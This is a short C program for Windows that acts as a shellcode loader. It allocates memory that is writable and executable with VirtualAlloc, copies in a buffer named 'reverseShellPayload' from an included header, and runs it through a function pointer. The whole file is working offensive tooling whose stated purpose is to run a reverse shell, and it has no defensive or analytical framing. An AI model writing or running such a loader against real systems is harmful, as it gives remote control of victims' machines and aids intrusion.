#include <stdio.h>
#include <windows.h>
#include "shellcode.h"
int main() {
    // allocate memory WITHIN CURRENT LOCAL process for the shellcode
    void *exec = VirtualAlloc(0, scSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    // copy the shellcode to the allocated memory
    memcpy(exec, reverseShellPayload, scSize);
    // cast the allocated memory to a function pointer and execute it
    ((void(*)())exec)();
    return 0;
}
